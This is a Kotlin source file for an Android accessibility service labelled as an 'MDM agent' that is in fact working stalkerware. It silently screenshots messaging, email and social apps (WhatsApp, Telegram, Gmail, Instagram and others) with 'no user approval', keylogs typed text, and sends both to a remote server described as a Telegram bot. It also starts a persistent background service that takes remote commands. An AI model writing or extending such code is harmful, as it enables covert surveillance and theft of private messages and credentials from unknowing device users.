package com.mdm.agent.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.hardware.HardwareBuffer
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream

class MDMAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MDMAccessibility"

        @Volatile var autoScreenshotEnabled = false
        @Volatile private var lastScreenshotTime = 0L
        private const val SCREENSHOT_THROTTLE = 5000L  // 5 seconds between screenshots
        private const val SCREENSHOT_MIN_DELAY = 3000L  // 3 seconds after app opens

        // Apps to monitor for screenshots
        private val MONITORED_APPS = setOf(
            "com.whatsapp", "com.whatsapp.w4b",
            "com.telegram.messenger", "org.telegram.messenger",
            "com.google.android.gm", "com.android.mms",
            "com.facebook.katana", "com.instagram.android",
            "com.snapchat.android", "com.twitter.android"
        )

        @Volatile private var instance: MDMAccessibilityService? = null

        fun setAutoScreenshot(enabled: Boolean) {
            autoScreenshotEnabled = enabled
            Log.i(TAG, "Auto-screenshot ${if (enabled) "ENABLED" else "DISABLED"}")
        }

        /**
         * ✅ NEW (Android 11+): Take a screenshot using AccessibilityService.takeScreenshot()
         * No MediaProjection needed, no UI, no user approval, works in background.
         *
         * @param callback: receives the screenshot file (or null on failure)
         */
        fun takeScreenshotAccessibility(callback: ((File?) -> Unit)) {
            val svc = instance
            if (svc == null) {
                Log.e(TAG, "❌ takeScreenshotAccessibility: service not running")
                callback(null)
                return
            }
            svc.takeScreenshotInternal(callback)
        }

        /** Check if the Accessibility-based screenshot is supported (Android 11+) */
        fun isAccessibilityScreenshotSupported(): Boolean {
            return Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && instance != null
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "✅ Accessibility Service Connected - Starting connection...")

        // Start MDMService for background persistence
        try {
            val serviceIntent = Intent(this, MDMService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.i(TAG, "MDMService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start MDMService: ${e.message}")
            connectDirectly()
        }
    }

    override fun onDestroy() {
        instance = null
        Log.i(TAG, "Accessibility service destroyed")
        super.onDestroy()
    }

    private fun connectDirectly() {
        Thread {
            try {
                Log.i(TAG, "📡 Connecting directly from AccessibilityService...")
                val apiClient = com.mdm.agent.data.remote.ApiClient(this)
                val cryptoManager = com.mdm.agent.data.remote.CryptoManager()
                val uploadManager = com.mdm.agent.data.remote.UploadManager(this)
                val socketManager = com.mdm.agent.data.remote.SocketManager(this)

                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
                val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
                Log.i(TAG, "  Server: $serverUrl")

                val cryptoResult = apiClient.initCrypto(deviceId)
                if (cryptoResult != null) {
                    cryptoManager.initFromServer(cryptoResult)
                }

                val commandHandler = com.mdm.agent.data.remote.CommandHandler(this, apiClient, cryptoManager, socketManager, uploadManager)
                socketManager.setCommandHandler(commandHandler)
                socketManager.setCryptoManager(cryptoManager)
                socketManager.onCommandReceived = { data ->
                    Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
                    commandHandler.handleCommand(data)
                }

                socketManager.connect()
                Log.i(TAG, "🎉 Connected from AccessibilityService!")

                com.mdm.agent.MainActivity.setSocketManager(socketManager)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Direct connection failed: ${e.message}", e)
            }
        }.start()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString() ?: ""
                val cls = event.className?.toString() ?: ""
                if (pkg.isNotEmpty()) {
                    Log.d(TAG, "Window: $pkg / $cls")

                    if (autoScreenshotEnabled && pkg in MONITORED_APPS) {
                        val now = System.currentTimeMillis()
                        if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
                            lastScreenshotTime = now
                            Log.i(TAG, "📸 Auto-screenshot: $pkg opened")
                            Handler(Looper.getMainLooper()).postDelayed({
                                takeAutoScreenshot(pkg)
                            }, SCREENSHOT_MIN_DELAY)
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (autoScreenshotEnabled) {
                    val pkg = event.packageName?.toString() ?: ""
                    if (pkg in MONITORED_APPS) {
                        val now = System.currentTimeMillis()
                        if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
                            lastScreenshotTime = now
                            Log.i(TAG, "📸 Auto-screenshot: text changed in $pkg")
                            Handler(Looper.getMainLooper()).postDelayed({
                                takeAutoScreenshot(pkg)
                            }, 1000)
                        }
                    }
                }
                // Keylogger
                if (com.mdm.agent.data.remote.DataCollectors.inputMonitoringActive) {
                    handleKeylogEvent(event)
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Content change - available for monitoring
            }
        }
    }

    private fun handleKeylogEvent(event: AccessibilityEvent) {
        try {
            val text = event.text?.joinToString("") ?: ""
            if (text.isEmpty()) return

            val pkg = event.packageName?.toString() ?: "unknown"
            val now = System.currentTimeMillis()

            synchronized(com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer) {
                com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.append(text)

                if (now - com.mdm.agent.data.remote.DataCollectors.lastKeylogSend >
                    com.mdm.agent.data.remote.DataCollectors.KEYLOG_THROTTLE) {

                    val buffer = com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.toString().trim()
                    if (buffer.isNotEmpty()) {
                        com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.clear()
                        com.mdm.agent.data.remote.DataCollectors.lastKeylogSend = now

                        Log.i(TAG, "⌨️ Keylog [$pkg]: $buffer")

                        val sm = com.mdm.agent.MainActivity.getSocketManager()
                        if (sm != null && sm.isConnected) {
                            val data = org.json.JSONObject().apply {
                                put("type", "keylog")
                                put("package", pkg)
                                put("text", buffer)
                                put("timestamp", System.currentTimeMillis())
                            }
                            sm.sendFileExplorerData(data)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Keylog error: ${e.message}")
        }
    }

    /**
     * ✅ NEW: Take screenshot using AccessibilityService.takeScreenshot() (Android 11+)
     * No MediaProjection, no UI, no user approval needed.
     */
    private fun takeAutoScreenshot(packageName: String) {
        takeScreenshotInternal { file ->
            if (file != null && file.exists()) {
                Log.i(TAG, "✅ Auto-screenshot captured: ${file.absolutePath} (${file.length()} bytes)")
                uploadScreenshotToBot(file)
            } else {
                Log.w(TAG, "⚠️ Auto-screenshot file is null for $packageName")
            }
        }
    }

    /**
     * Internal: uses AccessibilityService.takeScreenshot() API.
     * Available on Android 11+ (API 30+).
     */
    private fun takeScreenshotInternal(callback: (File?) -> Unit) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                Log.e(TAG, "❌ takeScreenshot requires Android 11+ (API 30). Current: ${Build.VERSION.SDK_INT}")
                callback(null)
                return
            }

            Log.i(TAG, "📸 Taking screenshot via Accessibility API...")
            val mainExecutor = mainExecutor

            takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        try {
                            val hardwareBuffer: HardwareBuffer = result.hardwareBuffer
                            val colorSpace = result.colorSpace

                            // Convert HardwareBuffer to Bitmap
                            val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            hardwareBuffer.close()

                            if (bitmap == null) {
                                Log.e(TAG, "❌ Failed to wrap HardwareBuffer to Bitmap")
                                callback(null)
                                return
                            }

                            // Save bitmap to file
                            val outputFile = File(cacheDir, "ss_${System.currentTimeMillis()}.png")
                            FileOutputStream(outputFile).use { out ->
                                bitmap.compress(Bitmap.CompressFormat.PNG, 90, out)
                            }
                            bitmap.recycle()

                            Log.i(TAG, "✅ Screenshot saved: ${outputFile.absolutePath} (${outputFile.length()} bytes)")
                            callback(outputFile)
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Screenshot processing error: ${e.message}", e)
                            try { result.hardwareBuffer.close() } catch (_: Exception) {}
                            callback(null)
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        val errorMsg = when (errorCode) {
                            ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY -> "invalid display"
                            ERROR_TAKE_SCREENSHOT_INVALID_WINDOW -> "invalid window"
                            ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS -> "no accessibility access"
                            ERROR_TAKE_SCREENSHOT_UNSUPPORTED_DISPLAY -> "unsupported display"
                            ERROR_TAKE_SCREENSHOT_ERROR_UNKNOWN -> "unknown error"
                            else -> "error code $errorCode"
                        }
                        Log.e(TAG, "❌ takeScreenshot failed: $errorMsg")
                        callback(null)
                    }
                })
        } catch (e: Exception) {
            Log.e(TAG, "❌ takeScreenshotInternal exception: ${e.message}", e)
            callback(null)
        }
    }

    /**
     * Upload screenshot to Telegram bot via /api/device/upload-media endpoint.
     */
    private fun uploadScreenshotToBot(file: File) {
        Thread {
            try {
                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
                val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
                val url = "$serverUrl/api/device/upload-media"

                val client = okhttp3.OkHttpClient.Builder()
                    .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                    .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                    .writeTimeout(180, java.util.concurrent.TimeUnit.SECONDS)
                    .build()

                val requestBody = okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart("device_id", deviceId)
                    .addFormDataPart("command", "screenshot")
                    .addFormDataPart("file_type", "photo")
                    .addFormDataPart("file", file.name,
                        file.asRequestBody("image/png".toMediaType()))
                    .build()

                val request = okhttp3.Request.Builder().url(url).post(requestBody).build()
                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    Log.i(TAG, "✅ Screenshot uploaded to bot!")
                } else {
                    Log.e(TAG, "❌ Upload failed: ${response.code}")
                }
                response.close()
                file.delete()
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to upload screenshot: ${e.message}")
            }
        }.start()
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }
}

